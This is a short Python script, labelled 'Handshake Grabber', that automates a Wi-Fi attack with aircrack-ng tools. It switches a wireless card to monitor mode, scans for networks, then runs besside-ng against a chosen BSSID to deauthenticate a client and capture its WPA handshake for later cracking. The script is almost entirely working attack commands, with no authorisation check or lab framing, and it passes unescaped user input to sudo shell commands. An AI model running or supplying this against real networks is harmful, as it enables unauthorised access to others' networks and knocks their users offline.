#import module to run terminal commands
import os

#ASCII art                                                                                            
print("  _    _                 _     _           _           _____           _     _               ")                                                                                            
print(" | |  | |               | |   | |         | |         / ____|         | |   | |              ")
print(" | |__| | __ _ _ __   __| |___| |__   __ _| | _____  | |  __ _ __ __ _| |__ | |__   ___ _ __ ")
print(" |  __  |/ _` | '_ \ / _` / __| '_ \ / _` | |/ / _ \ | | |_ | '__/ _` | '_ \| '_ \ / _ \ '__|")
print(" | |  | | (_| | | | | (_| \__ \ | | | (_| |   <  __/ | |__| | | | (_| | |_) | |_) |  __/ |   ")
print(" |_|  |_|\__,_|_| |_|\__,_|___/_| |_|\__,_|_|\_\___|  \_____|_|  \__,_|_.__/|_.__/ \___|_|   ")


#start
start = input("\nTo start press any key\n")


#starts airmon-ng with sudous privileges
os.system("sudo airmon-ng")


#waits for input of the card name you want to use to grab the handshake
card = input("Enter card name: ")


#starts wireless card in monitor mode
command = "sudo airmon-ng start " + card

os.system(command)


#starts airodump-ng so you can find the network bssid
command = "sudo airodump-ng " + card + "mon"

os.system(command)


#input the ssid to create a folder with .log and .cap files
ssid = input("Enter ssid name: ")

os.mkdir(ssid)

os.chdir(ssid)


#input the bssid
bssid = input("Enter bssid: ")


#deauths a client and grabs a handshake
command = "sudo besside-ng -b " + bssid + " " + card + "mon"

os.system(command)

#exits monitor mode
command = "sudo airmon-ng stop " + card + "mon"

os.system(command)

print("Network card is now in default mode")
